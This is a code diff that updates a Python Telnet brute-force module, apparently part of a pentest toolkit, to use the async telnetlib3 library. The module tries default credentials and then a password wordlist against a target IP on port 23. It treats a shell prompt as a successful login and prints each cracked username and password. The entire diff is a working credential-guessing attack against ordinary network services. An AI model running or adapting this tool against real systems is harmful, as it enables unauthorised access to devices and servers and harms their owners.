@@ -1,3 +1,5 @@
+import telnetlib3
+import asyncio
 import socket
 import os
 from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
@@ -9,38 +11,45 @@ SYM_SUCCESS = "🔑"
 SYM_FAILED = "🔒"
 
 
-def test_telnet(target_ip, port, username, password):
+async def test_telnet(target_ip, port, username, password):
     """
-    Attempting Telnet login using telnetlib with prompt-based interaction.
+    Attempting Telnet login using telnetlib3 with prompt-based interaction.
     """
     try:
         # Flash connection
-        tn = telnetlib.Telnet(target_ip, int(port), timeout=2.5)
+        reader, writer = await telnetlib3.open_connection(
+            host=target_ip,
+            port=int(port),
+            connect_minwait=0.05,
+            connect_maxwait=2.5
+        )
 
         # Look for a login (e.g.: "login:")
-        tn.read_until(b"login: ", timeout=1)
-        tn.write(username.encode("ascii") + b"\n")
+        await asyncio.wait_for(reader.readuntil("login: "), timeout=1)
+        writer.write(username + "\n")
 
         # Look for a password prompt (e.g.: "Password:")
-        tn.read_until(b"Password: ", timeout=1)
-        tn.write(password.encode("ascii") + b"\n")
+        await asyncio.wait_for(reader.readuntil("Password: "), timeout=1)
+        writer.write(password + "\n")
 
-        # Read the response looking for a shell prompt ($ or #) as a sign of success.
-        result = tn.read_until(b"$", timeout=1.5)
-        result += tn.read_until(b"#", timeout=1.5)
+        # Read the response looking for a shell prompt ($ or #)
+        try:
+            result = await asyncio.wait_for(reader.readuntil("$"), timeout=1.5)
+        except asyncio.TimeoutError:
+            result = await asyncio.wait_for(reader.readuntil("#"), timeout=1.5)
 
-        tn.close()
+        writer.close()
 
-        # Verification: If a shell prompt is found, consider it successful.
-        return b"$" in result or b"#" in result
+        # Verification
+        return "$" in result or "#" in result
 
-    except (socket.timeout, socket.error, EOFError):
+    except (asyncio.TimeoutError, socket.timeout, socket.error, EOFError):
         return False
     except Exception:
         return False
 
 
-def execute(options):
+async def _execute_async(options):
     """Operate BruteForce Telnet"""
     target_ip = options.get("IP")
     port = 23
@@ -56,7 +65,7 @@ def execute(options):
 
     try:
         for user, passwd in DEFAULT_CREDS:
-            if test_telnet(target_ip, port, user, passwd):
+            if await test_telnet(target_ip, port, user, passwd):
                 print(
                     f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{user} P:{passwd}"
                 )
@@ -81,7 +90,7 @@ def execute(options):
                             passwd = line.strip()
                             if not passwd:
                                 continue
-                            if test_telnet(target_ip, port, target_user, passwd):
+                            if await test_telnet(target_ip, port, target_user, passwd):
                                 print(
                                     f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{target_user} P:{passwd}"
                                 )
@@ -102,4 +111,13 @@ def execute(options):
     except KeyboardInterrupt:
         return
     except Exception as e:
-        print("{C.ERROR}[x] GLOBAL ERROR: {e}")
+        print(f"{C.ERROR}[x] GLOBAL ERROR: {e}")
+
+
+def execute(options):
+    try:
+        asyncio.run(_execute_async(options))
+    except RuntimeError:
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(_execute_async(options))
+
